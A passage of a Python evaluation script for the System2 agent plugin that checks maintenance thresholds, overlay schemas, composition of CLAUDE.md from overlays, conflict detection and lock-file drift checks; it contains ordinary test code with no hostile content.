            )

    record(
        "EVAL-MAINT-001",
        "Diff-size growth ratio within threshold",
        len(violations) == 0,
        "; ".join(violations) if violations else "",
    )


def eval_maint_002():
    """EVAL-MAINT-002: Interface churn within threshold"""
    try:
        thresholds = load_golden("maintenance_thresholds.json")
        max_new = thresholds["interface_churn_max_new_exports_per_task"]
        snapshots = _load_fixture_snapshots()
        meta_path = FIXTURES_DIR / "anti-slop-sequence" / "metadata.json"
        with open(meta_path) as f:
            meta = json.load(f)
        modules = meta["modules"]
    except FileNotFoundError as e:
        record("EVAL-MAINT-002", "Interface churn within threshold", False,
               f"Fixture or golden file not found: {e}")
        return

    violations = []
    for i in range(len(snapshots) - 1):
        snap_from = snapshots[i]
        snap_to = snapshots[i + 1]
        label = f"{snap_from}->{snap_to}"
        net_new_count = 0
        for mod in modules:
            exports_before = set(_extract_public_exports(_read_fixture_file(snap_from, mod)))
            exports_after = set(_extract_public_exports(_read_fixture_file(snap_to, mod)))
            new_exports = exports_after - exports_before
            net_new_count += len(new_exports)
        if net_new_count > max_new:
            violations.append(
                f"{label}: {net_new_count} net new exports, max allowed={max_new}"
            )

    record(
        "EVAL-MAINT-002",
        "Interface churn within threshold",
        len(violations) == 0,
        "; ".join(violations) if violations else "",
    )


def eval_maint_003():
    """EVAL-MAINT-003: Test preservation rate above threshold"""
    try:
        thresholds = load_golden("maintenance_thresholds.json")
        min_rate = thresholds["test_preservation_min_rate"]
        snapshots = _load_fixture_snapshots()
        meta_path = FIXTURES_DIR / "anti-slop-sequence" / "metadata.json"
        with open(meta_path) as f:
            meta = json.load(f)
        test_file = meta["test_file"]
    except FileNotFoundError as e:
        record("EVAL-MAINT-003", "Test preservation rate above threshold", False,
               f"Fixture or golden file not found: {e}")
        return

    baseline_content = _read_fixture_file(snapshots[0], test_file)
    baseline_tests = set(_extract_test_functions(baseline_content))

    if not baseline_tests:
        record("EVAL-MAINT-003", "Test preservation rate above threshold", False,
               "No test functions found in baseline")
        return

    violations = []
    for snap in snapshots[1:]:
        snap_content = _read_fixture_file(snap, test_file)
        snap_tests = set(_extract_test_functions(snap_content))
        preserved = baseline_tests & snap_tests
        rate = len(preserved) / len(baseline_tests)
        if rate < min_rate:
            missing = sorted(baseline_tests - snap_tests)
            violations.append(
                f"{snap}: preservation={rate:.2f} ({len(preserved)}/{len(baseline_tests)}), "
                f"min required={min_rate}, missing={missing}"
            )

    record(
        "EVAL-MAINT-003",
        "Test preservation rate above threshold",
        len(violations) == 0,
        "; ".join(violations) if violations else "",
    )


# ---------------------------------------------------------------------------
# Overlay eval implementations
# ---------------------------------------------------------------------------

def eval_ovl_001():
    """EVAL-OVL-001: overlay.schema.json exists, valid JSON, and covers all contribution types"""
    path = f"{PLUGIN_DIR}/schemas/overlay.schema.json"
    errors = []
    if not file_exists(path):
        errors.append(f"{path} does not exist")
    else:
        content = read_file(path)
        try:
            schema = json.loads(content)
        except json.JSONDecodeError as e:
            errors.append(f"{path} is not valid JSON: {e}")
            schema = None

        if schema:
            # Check required top-level fields are documented.
            req = schema.get("required", [])
            for field in ("name", "version", "description", "schema_version", "contributions"):
                if field not in req:
                    errors.append(f"schema missing {field!r} in required list")

            # Check all 7 contribution type keys are present.
            contribs_props = (
                schema.get("properties", {})
                .get("contributions", {})
                .get("properties", {})
            )
            expected_types = {
                "orchestrator", "delegation", "agents", "spec",
                "auxiliary_agents", "mcp_servers", "permissions",
            }
            for ct in sorted(expected_types):
                if ct not in contribs_props:
                    errors.append(f"schema missing contribution type {ct!r}")

            # Check _meta has valid_pipeline_agents.
            meta = schema.get("_meta", {})
            agents = meta.get("valid_pipeline_agents", [])
            if len(agents) != 13:
                errors.append(
                    f"schema _meta.valid_pipeline_agents has {len(agents)} "
                    f"agents, expected 13"
                )

    record(
        "EVAL-OVL-001",
        "overlay.schema.json exists, valid, covers all contribution types",
        len(errors) == 0,
        "; ".join(errors) if errors else "",
    )


def eval_ovl_002():
    """EVAL-OVL-002: anchor-map.json has 13 agents, 22 anchors, all after_section headings exist in agent files"""
    path = f"{PLUGIN_DIR}/schemas/anchor-map.json"
    errors = []
    if not file_exists(path):
        errors.append(f"{path} does not exist")
        record(
            "EVAL-OVL-002",
            "anchor-map.json integrity and sync validation",
            False,
            errors[0],
        )
        return

    content = read_file(path)
    try:
        data = json.loads(content)
    except json.JSONDecodeError as e:
        record(
            "EVAL-OVL-002",
            "anchor-map.json integrity and sync validation",
            False,
            f"{path} is not valid JSON: {e}",
        )
        return

    agents = data.get("agents", {})
    agent_count = len(agents)
    if agent_count != 13:
        errors.append(f"expected 13 agents, got {agent_count}")

    total_anchors = sum(len(a.get("anchors", {})) for a in agents.values())
    if total_anchors != 22:
        errors.append(f"expected 22 anchors total, got {total_anchors}")

    # Sync validation: each anchor's after_section heading must exist in the
    # corresponding agent .md file.
    for agent_name, agent_info in agents.items():
        agent_file = f"{PLUGIN_DIR}/agents/{agent_name}.md"
        agent_content = read_file(agent_file)
        if not agent_content:
            errors.append(f"{agent_file} does not exist or is empty")
            continue
        for anchor_name, anchor_info in agent_info.get("anchors", {}).items():
            after_section = anchor_info.get("after_section", "")
            if after_section and after_section not in agent_content:
                errors.append(
                    f"{agent_name}.{anchor_name}: after_section "
                    f"{after_section!r} not found in {agent_file}"
                )

    record(
        "EVAL-OVL-002",
        "anchor-map.json integrity and sync validation",
        len(errors) == 0,
        "; ".join(errors[:5]) if errors else "",
    )


def eval_ovl_003():
    """EVAL-OVL-003: composer.py exists and is syntactically valid Python"""
    path = f"{PLUGIN_DIR}/scripts/composer.py"
    errors = []
    if not file_exists(path):
        errors.append(f"{path} does not exist")
    else:
        content = read_file(path)
        try:
            ast.parse(content, filename=path)
        except SyntaxError as e:
            errors.append(f"{path} has syntax error: {e}")
    record(
        "EVAL-OVL-003",
        "composer.py exists and is syntactically valid Python",
        len(errors) == 0,
        "; ".join(errors) if errors else "",
    )


def eval_ovl_004():
    """EVAL-OVL-004: Composition with test fixture succeeds in dry-run mode"""
    fixture_path = str(FIXTURES_DIR / "test-overlay")
    base_path = str(REPO_ROOT / PLUGIN_DIR)
    errors = []

    if not (FIXTURES_DIR / "test-overlay" / "system2.overlay.json").is_file():
        errors.append("test fixture system2.overlay.json not found")
        record(
            "EVAL-OVL-004",
            "Composition with test fixture succeeds (dry-run)",
            False,
            errors[0],
        )
        return

    result = subprocess.run(
        [
            sys.executable,
            str(REPO_ROOT / PLUGIN_DIR / "scripts" / "composer.py"),
            "--base", base_path,
            "--overlays", fixture_path,
            "--project", "/tmp/test-compose-eval",
            "--dry-run",
            "--format", "json",
        ],
        capture_output=True,
        text=True,
        timeout=30,
        cwd=str(REPO_ROOT),
    )

    if result.returncode != 0:
        stderr_snippet = result.stderr[:300] if result.stderr else ""
        stdout_snippet = result.stdout[:300] if result.stdout else ""
        errors.append(
            f"composer.py dry-run exited with code {result.returncode}; "
            f"stderr: {stderr_snippet}; stdout: {stdout_snippet}"
        )
    else:
        # Verify output contains expected contribution types.
        try:
            output = json.loads(result.stdout)
            report = output.get("report", {})
            applied = report.get("contributions_applied", {})
            expected_types = [
                "orchestrator.principles",
                "delegation.advisory_sources",
            ]
            for etype in expected_types:
                if etype not in applied:
                    errors.append(
                        f"expected contribution type {etype!r} not in "
                        f"contributions_applied: {list(applied.keys())}"
                    )
        except json.JSONDecodeError as e:
            errors.append(f"composer.py dry-run output is not valid JSON: {e}")

    record(
        "EVAL-OVL-004",
        "Composition with test fixture succeeds (dry-run)",
        len(errors) == 0,
        "; ".join(errors) if errors else "",
    )


def eval_ovl_005():
    """EVAL-OVL-005: Composed CLAUDE.md preserves base content and includes overlay content"""
    fixture_path = str(FIXTURES_DIR / "test-overlay")
    base_path = str(REPO_ROOT / PLUGIN_DIR)
    errors = []

    if not (FIXTURES_DIR / "test-overlay" / "system2.overlay.json").is_file():
        errors.append("test fixture system2.overlay.json not found")
        record(
            "EVAL-OVL-005",
            "Composed CLAUDE.md preserves base + adds overlay content",
            False,
            errors[0],
        )
        return

    tmpdir = tempfile.mkdtemp(prefix="eval-ovl-005-")
    try:
        pre_git_check = subprocess.run(
            ["git", "diff", "--name-only", "--", "plugin/"],
            capture_output=True,
            text=True,
            cwd=str(REPO_ROOT),
        )
        pre_plugin_diff = set(pre_git_check.stdout.splitlines())

        result = subprocess.run(
            [
                sys.executable,
                str(REPO_ROOT / PLUGIN_DIR / "scripts" / "composer.py"),
                "--base", base_path,
                "--overlays", fixture_path,
                "--project", tmpdir,
                "--format", "json",
            ],
            capture_output=True,
            text=True,
            timeout=30,
            cwd=str(REPO_ROOT),
        )

        if result.returncode != 0:
            stderr_snippet = result.stderr[:300] if result.stderr else ""
            errors.append(
                f"composer.py exited with code {result.returncode}; "
                f"stderr: {stderr_snippet}"
            )
        else:
            composed_path = os.path.join(tmpdir, "CLAUDE.md")
            if not os.path.isfile(composed_path):
                errors.append("composed CLAUDE.md was not written")
            else:
                with open(composed_path, "r", encoding="utf-8") as fh:
                    composed = fh.read()

                # Verify base content is preserved.
                base_markers = [
                    "System2 orchestrator",
                    "Delegation map",
                    "untrusted input",
                ]
                for marker in base_markers:
                    if marker not in composed:
                        errors.append(
                            f"base content marker {marker!r} not found "
                            f"in composed CLAUDE.md"
                        )

                # Verify overlay content is present.
                overlay_markers = [
                    "test-overlay",
                    "validate inputs before processing",
                ]
                for marker in overlay_markers:
                    if marker not in composed:
                        errors.append(
                            f"overlay content marker {marker!r} not found "
                            f"in composed CLAUDE.md"
                        )

            # Verify base invariant evals still pass after composition.
            pre_results_len = len(results)
            base_invariant_evals = [
                eval_inv_001, eval_inv_002,
                eval_sec_001, eval_sec_002, eval_sec_003,
            ]
            for eval_fn in base_invariant_evals:
                eval_fn()
            post_results = results[pre_results_len:]
            for r in post_results:
                if not r.passed:
                    errors.append(
                        f"base invariant {r.eval_id} failed after composition: "
                        f"{r.message}"
                    )
            # Remove these results — they were run as a sub-check, not standalone.
            del results[pre_results_len:]

            # Verify base System2 repo is unmodified by composition.
            git_check = subprocess.run(
                ["git", "diff", "--name-only", "--", "plugin/"],
                capture_output=True,
                text=True,
                cwd=str(REPO_ROOT),
            )
            post_plugin_diff = set(git_check.stdout.splitlines())
            new_plugin_diff = sorted(post_plugin_diff - pre_plugin_diff)
            if git_check.returncode == 0 and new_plugin_diff:
                errors.append(
                    f"composition modified base plugin files: "
                    f"{', '.join(new_plugin_diff)}"
                )
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)

    record(
        "EVAL-OVL-005",
        "Composed CLAUDE.md preserves base + adds overlay content",
        len(errors) == 0,
        "; ".join(errors) if errors else "",
    )


def eval_ovl_006():
    """EVAL-OVL-006: Skipped unknown-anchor contributions do not block composition (REQ-OVL-051)"""
    fixture_path = str(FIXTURES_DIR / "skipped-anchor-injection")
    base_path = str(REPO_ROOT / PLUGIN_DIR)
    errors = []

    manifest_file = FIXTURES_DIR / "skipped-anchor-injection" / "system2.overlay.json"
    if not manifest_file.is_file():
        errors.append("skipped-anchor-injection fixture not found")
        record("EVAL-OVL-006", "Skipped anchor with injection does not block compose", False, errors[0])
        return

    result = subprocess.run(
        [
            sys.executable,
            str(REPO_ROOT / PLUGIN_DIR / "scripts" / "composer.py"),
            "--base", base_path,
            "--overlays", fixture_path,
            "--project", "/tmp/test-compose-ovl006",
            "--dry-run",
            "--format", "json",
        ],
        capture_output=True,
        text=True,
        timeout=30,
        cwd=str(REPO_ROOT),
    )

    if result.returncode != 0:
        errors.append(
            f"composer.py exited {result.returncode} (expected 0); "
            f"skipped unknown-anchor injection content should not block composition; "
            f"stderr: {result.stderr[:200]}"
        )
    else:
        try:
            output = json.loads(result.stdout)
            report = output.get("report", {})
            injection_warns = report.get("injection_warnings", [])
            if injection_warns:
                errors.append(
                    f"injection_warnings should be empty for skipped contributions "
                    f"but got: {injection_warns}"
                )
            validation_warns = report.get("validation_warnings", [])
            has_anchor_warning = any("missing_anchor" in w or "unknown anchor" in w for w in validation_warns)
            if not has_anchor_warning:
                errors.append("expected a validation warning about the unknown anchor")
        except (json.JSONDecodeError, KeyError) as exc:
            errors.append(f"failed to parse composer output: {exc}")

    record(
        "EVAL-OVL-006",
        "Skipped anchor with injection does not block compose (REQ-OVL-051)",
        len(errors) == 0,
        "; ".join(errors) if errors else "",
    )


def eval_ovl_007():
    """EVAL-OVL-007: known_conflicts declarations produce structural conflicts"""
    from composer import detect_conflicts

    anchor_map = json.loads(read_file(os.path.join(PLUGIN_DIR, "schemas", "anchor-map.json")))
    errors = []

    manifests = [
        {"name": "overlay-a", "version": "1.0.0", "tags": [],
         "compatibility": {"known_conflicts": ["overlay-b"]},
         "contributions": {}},
        {"name": "overlay-b", "version": "1.0.0", "tags": [],
         "compatibility": {"known_conflicts": []},
         "contributions": {}},
    ]
    report = detect_conflicts(manifests, anchor_map)
    if not report.has_structural_conflicts:
        errors.append("expected structural conflict from known_conflicts declaration")
    else:
        types = [c["type"] for c in report.structural_conflicts]
        if "known_conflicts" not in types:
            errors.append(f"expected 'known_conflicts' type, got {types}")

    # Negative case: no known_conflicts should produce no structural conflicts.
    clean = [
        {"name": "overlay-a", "version": "1.0.0", "tags": [],
         "compatibility": {"known_conflicts": []},
         "contributions": {}},
        {"name": "overlay-b", "version": "1.0.0", "tags": [],
         "compatibility": {"known_conflicts": []},
         "contributions": {}},
    ]
    clean_report = detect_conflicts(clean, anchor_map)
    if clean_report.has_structural_conflicts:
        errors.append("clean manifests should not have structural conflicts")

    record(
        "EVAL-OVL-007",
        "known_conflicts declarations produce structural conflicts",
        len(errors) == 0,
        "; ".join(errors) if errors else "",
    )


def eval_ovl_008():
    """EVAL-OVL-008: Auxiliary agent name collisions across overlays are structural conflicts"""
    from composer import detect_conflicts

    anchor_map = json.loads(read_file(os.path.join(PLUGIN_DIR, "schemas", "anchor-map.json")))
    errors = []

    manifests = [
        {"name": "overlay-a", "version": "1.0.0", "tags": [],
         "compatibility": {},
         "contributions": {
             "auxiliary_agents": [
                 {"name": "shared-scout", "role": "scout", "pipeline": False,
                  "delegation_policy": "orchestrator_optional", "agent_file": "agents/scout.md"}
             ]
         }},
        {"name": "overlay-b", "version": "1.0.0", "tags": [],
         "compatibility": {},
         "contributions": {
             "auxiliary_agents": [
                 {"name": "shared-scout", "role": "scout", "pipeline": False,
                  "delegation_policy": "orchestrator_optional", "agent_file": "agents/scout.md"}
             ]
         }},
    ]
    report = detect_conflicts(manifests, anchor_map)
    if not report.has_structural_conflicts:
        errors.append("expected structural conflict from auxiliary agent name collision")
    else:
        types = [c["type"] for c in report.structural_conflicts]
        if "auxiliary_agent_collision" not in types:
            errors.append(f"expected 'auxiliary_agent_collision' type, got {types}")

    record(
        "EVAL-OVL-008",
        "Auxiliary agent name collisions are structural conflicts",
        len(errors) == 0,
        "; ".join(errors) if errors else "",
    )


def eval_ovl_009():
    """EVAL-OVL-009: After-declaration cycles produce structural conflicts"""
    from composer import detect_conflicts

    anchor_map = json.loads(read_file(os.path.join(PLUGIN_DIR, "schemas", "anchor-map.json")))
    errors = []

    manifests = [
        {"name": "overlay-a", "version": "1.0.0", "tags": [],
         "compatibility": {},
         "contributions": {
             "orchestrator": {
                 "principles": [
                     {"id": "principle-a", "content_file": "a.md", "after": "principle-b"},
                 ]
             }
         }},
        {"name": "overlay-b", "version": "1.0.0", "tags": [],
         "compatibility": {},
         "contributions": {
             "orchestrator": {
                 "principles": [
                     {"id": "principle-b", "content_file": "b.md", "after": "principle-a"},
                 ]
             }
         }},
    ]
    report = detect_conflicts(manifests, anchor_map)
    if not report.has_structural_conflicts:
        errors.append("expected structural conflict from after-declaration cycle")
    else:
        types = [c["type"] for c in report.structural_conflicts]
        if "ordering_cycle" not in types:
            errors.append(f"expected 'ordering_cycle' type, got {types}")

    record(
        "EVAL-OVL-009",
        "After-declaration cycles produce structural conflicts",
        len(errors) == 0,
        "; ".join(errors) if errors else "",
    )


def eval_ovl_010():
    """EVAL-OVL-010: Deterministic additive ordering across overlays"""
    from composer import detect_conflicts

    anchor_map = json.loads(read_file(os.path.join(PLUGIN_DIR, "schemas", "anchor-map.json")))
    errors = []

    manifests = [
        {"name": "overlay-b", "version": "1.0.0", "tags": [],
         "compatibility": {},
         "contributions": {
             "orchestrator": {
                 "principles": [
                     {"id": "principle-b", "content_file": "b.md", "after": None},
                 ]
             }
         }},
        {"name": "overlay-a", "version": "1.0.0", "tags": [],
         "compatibility": {},
         "contributions": {
             "orchestrator": {
                 "principles": [
                     {"id": "principle-a", "content_file": "a.md", "after": None},
                 ]
             }
         }},
    ]
    report = detect_conflicts(manifests, anchor_map)
    if report.has_structural_conflicts:
        errors.append(f"unexpected structural conflicts: {report.structural_conflicts}")

    if not report.additive_overlaps:
        errors.append("expected additive overlap for orchestrator.principles")
    else:
        overlap = report.additive_overlaps[0]
        order = overlap.get("order", [])
        ids = [entry.get("id") for _, entry in order]
        if ids != ["principle-a", "principle-b"]:
            errors.append(
                f"expected lexicographic ordering [principle-a, principle-b], got {ids}"
            )

    # Verify determinism: same input reversed should yield same order.
    reversed_manifests = list(reversed(manifests))
    report2 = detect_conflicts(reversed_manifests, anchor_map)
    if report2.additive_overlaps:
        order2 = report2.additive_overlaps[0].get("order", [])
        ids2 = [entry.get("id") for _, entry in order2]
        if ids != ids2:
            errors.append(
                f"ordering not deterministic: {ids} vs {ids2}"
            )

    record(
        "EVAL-OVL-010",
        "Deterministic additive ordering across overlays",
        len(errors) == 0,
        "; ".join(errors) if errors else "",
    )


def eval_ovl_011():
    """EVAL-OVL-011: Semantic tension warnings for high-leverage surfaces"""
    from composer import detect_conflicts

    anchor_map = json.loads(read_file(os.path.join(PLUGIN_DIR, "schemas", "anchor-map.json")))
    errors = []

    # Two overlays contributing to orchestrator.principles (high-leverage surface).
    manifests = [
        {"name": "overlay-a", "version": "1.0.0", "tags": [],
         "compatibility": {},
         "contributions": {
             "orchestrator": {
                 "principles": [
                     {"id": "principle-a", "content_file": "a.md", "after": None},
                 ]
             }
         }},
        {"name": "overlay-b", "version": "1.0.0", "tags": [],
         "compatibility": {},
         "contributions": {
             "orchestrator": {
                 "principles": [
                     {"id": "principle-b", "content_file": "b.md", "after": None},
                 ]
             }
         }},
    ]
    report = detect_conflicts(manifests, anchor_map)
    hl_tensions = [t for t in report.semantic_tensions if t["type"] == "high_leverage_surface"]
    if not hl_tensions:
        errors.append("expected high_leverage_surface semantic tension for orchestrator.principles")

    # Two overlays contributing to a high-leverage anchor (safety_rules).
    anchor_manifests = [
        {"name": "overlay-a", "version": "1.0.0", "tags": [],
         "compatibility": {},
         "contributions": {
             "agents": {
                 "executor": {
                     "prompt_sections": {
                         "safety_rules": [
                             {"id": "safety-a", "content_file": "a.md", "after": None},
                         ]
                     }
                 }
             }
         }},
        {"name": "overlay-b", "version": "1.0.0", "tags": [],
         "compatibility": {},
         "contributions": {
             "agents": {
                 "executor": {
                     "prompt_sections": {
                         "safety_rules": [
                             {"id": "safety-b", "content_file": "b.md", "after": None},
                         ]
                     }
                 }
             }
         }},
    ]
    report2 = detect_conflicts(anchor_manifests, anchor_map)
    hl_tensions2 = [t for t in report2.semantic_tensions if t["type"] == "high_leverage_surface"]
    if not hl_tensions2:
        errors.append("expected high_leverage_surface semantic tension for executor.safety_rules")

    record(
        "EVAL-OVL-011",
        "Semantic tension warnings for high-leverage surfaces",
        len(errors) == 0,
        "; ".join(errors) if errors else "",
    )


def eval_ovl_012():
    """EVAL-OVL-012: Semantic tension warnings for shared review tags"""
    from composer import detect_conflicts

    anchor_map = json.loads(read_file(os.path.join(PLUGIN_DIR, "schemas", "anchor-map.json")))
    errors = []

    manifests = [
        {"name": "overlay-a", "version": "1.0.0", "tags": ["compute"],
         "compatibility": {"review_when_combined_with_tags": ["compute"]},
         "contributions": {}},
        {"name": "overlay-b", "version": "1.0.0", "tags": ["compute"],
         "compatibility": {},
         "contributions": {}},
    ]
    report = detect_conflicts(manifests, anchor_map)
    tag_tensions = [t for t in report.semantic_tensions if t["type"] == "shared_review_tag"]
    if not tag_tensions:
        errors.append("expected shared_review_tag semantic tension")
    else:
        if tag_tensions[0].get("tag") != "compute":
            errors.append(f"expected tag 'compute', got {tag_tensions[0].get('tag')}")

    # Negative: non-matching tags should produce no tension.
    clean_manifests = [
        {"name": "overlay-a", "version": "1.0.0", "tags": ["compute"],
         "compatibility": {"review_when_combined_with_tags": ["storage"]},
         "contributions": {}},
        {"name": "overlay-b", "version": "1.0.0", "tags": ["compute"],
         "compatibility": {},
         "contributions": {}},
    ]
    clean_report = detect_conflicts(clean_manifests, anchor_map)
    clean_tag_tensions = [t for t in clean_report.semantic_tensions if t["type"] == "shared_review_tag"]
    if clean_tag_tensions:
        errors.append("non-matching review tags should not produce tension")

    record(
        "EVAL-OVL-012",
        "Semantic tension warnings for shared review tags",
        len(errors) == 0,
        "; ".join(errors) if errors else "",
    )


# ---------------------------------------------------------------------------
# Doctor / drift-check evals
# ---------------------------------------------------------------------------

def _compose_fixture_overlay(tmp_dir):
    """Helper: compose the test-overlay fixture into a temp project dir.

    Returns (project_path, overlay_path, lock_data).
    """
    from composer import compose, _write_outputs

    project_path = os.path.join(tmp_dir, "project")
    os.makedirs(os.path.join(project_path, "spec"), exist_ok=True)

    plugin_root = str(REPO_ROOT / PLUGIN_DIR)
    overlay_path = str(FIXTURES_DIR / "test-overlay")

    result = compose(plugin_root, [overlay_path], project_path, dry_run=False)
    assert not result["errors"], f"Fixture composition failed: {result['errors']}"

    _write_outputs(
        project_path,
        result["claude_md"],
        result["lock"],
        result["auxiliary_agents"],
        pending_content_copies=result.get("pending_content_copies", []),
        overlay_info_for_lock=result.get("overlay_info_for_lock", []),
        valid_anchors_by_agent=result.get("valid_anchors_by_agent"),
    )

    lock_path = os.path.join(project_path, "spec", "overlay-manifest.lock")
    with open(lock_path, "r", encoding="utf-8") as fh:
        lock_data = json.load(fh)

    return project_path, overlay_path, lock_data


def eval_ovl_013():
    """EVAL-OVL-013: drift_check returns 'current' for freshly composed project"""
    from composer import drift_check

    errors = []
    tmp_dir = tempfile.mkdtemp(prefix="eval_ovl013_")
    try:
        project_path, overlay_path, lock_data = _compose_fixture_overlay(tmp_dir)
        plugin_root = str(REPO_ROOT / PLUGIN_DIR)

        result = drift_check(plugin_root, project_path)
        if result["status"] != "current":
            errors.append(f"expected status 'current', got {result['status']!r}")
        if not result["claude_md_composed"]:
            errors.append("expected claude_md_composed=True")
        if not result["overlays"]:
            errors.append("expected at least one overlay status")
        elif not result["overlays"][0]["source_exists"]:
            errors.append("expected source_exists=True")
        elif not result["overlays"][0]["manifest_match"]:
            errors.append("expected manifest_match=True")
    finally:
        shutil.rmtree(tmp_dir, ignore_errors=True)

    record(
        "EVAL-OVL-013",
        "drift_check returns 'current' for freshly composed project",
        len(errors) == 0,
        "; ".join(errors) if errors else "",
    )


def eval_ovl_014():
    """EVAL-OVL-014: drift_check detects stale base version"""
    from composer import drift_check

    errors = []
    tmp_dir = tempfile.mkdtemp(prefix="eval_ovl014_")
    try:
        project_path, overlay_path, lock_data = _compose_fixture_overlay(tmp_dir)
        plugin_root = str(REPO_ROOT / PLUGIN_DIR)

        # Mutate the lock to simulate a version mismatch.
        lock_path = os.path.join(project_path, "spec", "overlay-manifest.lock")
        lock_data["system2_version"] = "0.0.0-fake"
        with open(lock_path, "w", encoding="utf-8") as fh:
            json.dump(lock_data, fh, indent=2)

        result = drift_check(plugin_root, project_path)
        if result["status"] != "stale_base":
            errors.append(f"expected status 'stale_base', got {result['status']!r}")
        stale_msgs = [d for d in result["details"] if d["type"] == "stale_base"]
        if not stale_msgs:
            errors.append("expected a stale_base detail entry")
    finally:
        shutil.rmtree(tmp_dir, ignore_errors=True)

    record(
        "EVAL-OVL-014",
        "drift_check detects stale base version",
        len(errors) == 0,
        "; ".join(errors) if errors else "",
    )


def eval_ovl_015():
    """EVAL-OVL-015: drift_check detects stale overlay manifest"""
    from composer import drift_check

    errors = []
    tmp_dir = tempfile.mkdtemp(prefix="eval_ovl015_")
    try:
        project_path, overlay_path, lock_data = _compose_fixture_overlay(tmp_dir)
        plugin_root = str(REPO_ROOT / PLUGIN_DIR)

        # Mutate the lock's manifest_hash to simulate manifest drift.
        lock_path = os.path.join(project_path, "spec", "overlay-manifest.lock")
        lock_data["overlays"][0]["manifest_hash"] = "sha256:0000000000000000000000000000000000000000000000000000000000000000"
        with open(lock_path, "w", encoding="utf-8") as fh:
            json.dump(lock_data, fh, indent=2)

        result = drift_check(plugin_root, project_path)
        if result["status"] != "stale_overlay":
            errors.append(f"expected status 'stale_overlay', got {result['status']!r}")
        stale_msgs = [d for d in result["details"] if d["type"] == "stale_manifest"]
        if not stale_msgs:
            errors.append("expected a stale_manifest detail entry")
    finally:
        shutil.rmtree(tmp_dir, ignore_errors=True)

    record(
        "EVAL-OVL-015",
        "drift_check detects stale overlay manifest",
        len(errors) == 0,
        "; ".join(errors) if errors else "",
    )


def eval_ovl_016():
    """EVAL-OVL-016: drift_check detects stale overlay content"""
    from composer import drift_check

    errors = []
    tmp_dir = tempfile.mkdtemp(prefix="eval_ovl016_")
    try:
        project_path, overlay_path, lock_data = _compose_fixture_overlay(tmp_dir)
        plugin_root = str(REPO_ROOT / PLUGIN_DIR)

        # Mutate the lock's content_hash to simulate content drift.
        lock_path = os.path.join(project_path, "spec", "overlay-manifest.lock")
        lock_data["overlays"][0]["content_hash"] = "sha256:0000000000000000000000000000000000000000000000000000000000000000"
        with open(lock_path, "w", encoding="utf-8") as fh:
            json.dump(lock_data, fh, indent=2)

        result = drift_check(plugin_root, project_path)
        if result["status"] != "stale_overlay":
            errors.append(f"expected status 'stale_overlay', got {result['status']!r}")
        stale_msgs = [d for d in result["details"] if d["type"] == "stale_content"]
        if not stale_msgs:
            errors.append("expected a stale_content detail entry")
    finally:
        shutil.rmtree(tmp_dir, ignore_errors=True)

    record(
        "EVAL-OVL-016",
        "drift_check detects stale overlay content",
        len(errors) == 0,
        "; ".join(errors) if errors else "",
    )


def eval_ovl_017():
    """EVAL-OVL-017: drift_check detects missing overlay source path"""
    from composer import drift_check

    errors = []
    tmp_dir = tempfile.mkdtemp(prefix="eval_ovl017_")
    try:
        project_path, overlay_path, lock_data = _compose_fixture_overlay(tmp_dir)
        plugin_root = str(REPO_ROOT / PLUGIN_DIR)

        # Point the lock at a non-existent source path.
        lock_path = os.path.join(project_path, "spec", "overlay-manifest.lock")
        lock_data["overlays"][0]["source_path"] = "/nonexistent/path/to/overlay"
        with open(lock_path, "w", encoding="utf-8") as fh:
            json.dump(lock_data, fh, indent=2)

        result = drift_check(plugin_root, project_path)
        if result["status"] != "broken":
            errors.append(f"expected status 'broken', got {result['status']!r}")
        missing_msgs = [d for d in result["details"] if d["type"] == "missing_source"]
        if not missing_msgs:
            errors.append("expected a missing_source detail entry")
    finally:
        shutil.rmtree(tmp_dir, ignore_errors=True)

    record(
        "EVAL-OVL-017",
        "drift_check detects missing overlay source path",
        len(errors) == 0,
        "; ".join(errors) if errors else "",
    )


def eval_ovl_018():
    """EVAL-OVL-018: drift_check detects missing project-local overlay copy"""
    from composer import drift_check

    errors = []
    tmp_dir = tempfile.mkdtemp(prefix="eval_ovl018_")
    try:
        project_path, overlay_path, lock_data = _compose_fixture_overlay(tmp_dir)
        plugin_root = str(REPO_ROOT / PLUGIN_DIR)

        # Remove the project-local overlay copy.
        local_dir = os.path.join(project_path, ".system2", "overlays", "test-overlay")
        if os.path.isdir(local_dir):
            shutil.rmtree(local_dir)

        result = drift_check(plugin_root, project_path)
        if result["status"] != "broken":
            errors.append(f"expected status 'broken', got {result['status']!r}")
        missing_msgs = [d for d in result["details"] if d["type"] == "missing_local"]
        if not missing_msgs:
            errors.append("expected a missing_local detail entry")
    finally:
        shutil.rmtree(tmp_dir, ignore_errors=True)

    record(
        "EVAL-OVL-018",
        "drift_check detects missing project-local overlay copy",
        len(errors) == 0,
        "; ".join(errors) if errors else "",
    )


def eval_ovl_019():
    """EVAL-OVL-019: --from-lock recomposes using locked overlay paths"""
    errors = []
    tmp_dir = tempfile.mkdtemp(prefix="eval_ovl019_")
    try:
        project_path, overlay_path, lock_data = _compose_fixture_overlay(tmp_dir)
        plugin_root = str(REPO_ROOT / PLUGIN_DIR)

        # Verify lock file has source_path entries.
        lock_path = os.path.join(project_path, "spec", "overlay-manifest.lock")
        with open(lock_path, "r", encoding="utf-8") as fh:
            lock = json.load(fh)
        source_paths = [ov["source_path"] for ov in lock.get("overlays", [])]
        if not source_paths:
            errors.append("lock file has no overlay source paths")
        else:
            # Remove CLAUDE.md to verify recomposition writes it.
            claude_md_path = os.path.join(project_path, "CLAUDE.md")
            if os.path.isfile(claude_md_path):
                os.unlink(claude_md_path)

            # Run composer with --from-lock.
            cmd = [
                sys.executable, str(REPO_ROOT / PLUGIN_DIR / "scripts" / "composer.py"),
                "--base", plugin_root,
                "--project", project_path,
                "--from-lock",
                "--format", "json",
            ]
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            if proc.returncode != 0:
                errors.append(f"--from-lock exited with code {proc.returncode}: {proc.stderr}")
            elif not os.path.isfile(claude_md_path):
                errors.append("--from-lock did not write CLAUDE.md")
            else:
                with open(claude_md_path, "r", encoding="utf-8") as fh:
                    first_line = fh.readline()
                if not first_line.startswith("<!-- COMPOSED:"):
                    errors.append("recomposed CLAUDE.md missing COMPOSED header")
    finally:
        shutil.rmtree(tmp_dir, ignore_errors=True)

    record(
        "EVAL-OVL-019",
        "--from-lock recomposes using locked overlay paths",
        len(errors) == 0,
        "; ".join(errors) if errors else "",
    )


def eval_ovl_020():
    """EVAL-OVL-020: drift_check returns 'no_lock' when lock file is absent"""
    from composer import drift_check

    errors = []
